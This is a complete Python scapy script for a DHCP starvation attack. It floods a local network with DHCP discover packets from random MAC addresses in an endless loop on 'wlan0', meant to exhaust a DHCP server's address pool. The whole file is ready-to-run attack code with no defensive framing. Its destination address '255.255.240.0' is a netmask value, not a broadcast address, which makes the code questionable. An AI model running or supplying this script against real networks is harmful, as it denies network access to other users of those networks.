#!/usr/bin/env python3
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf

# Disable IP address checking to allow arbitrary source IPs
conf.checkIPaddr = False


# Function to create and send DHCP discovery packets
def dhcp_starvation():
    # Create a random MAC address
    random_mac = RandMAC()

    # Construct a DHCP discover packet
    dhcp_discover = (
            Ether(dst='ff:ff:ff:ff:ff:ff', src=random_mac) /
            IP(src='0.0.0.0', dst='255.255.240.0') /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=random_mac) /
            DHCP(options=[('message-type', 'discover'), 'end'])
    )

    # Send packets continuously on the specified interface
    print("[*] Starting DHCP Starvation Attack...")
    sendp(dhcp_discover, iface='wlan0', loop=1, verbose=1)
# Enter the correct interface depending on your machine.

if __name__ == "__main__":
    dhcp_starvation()
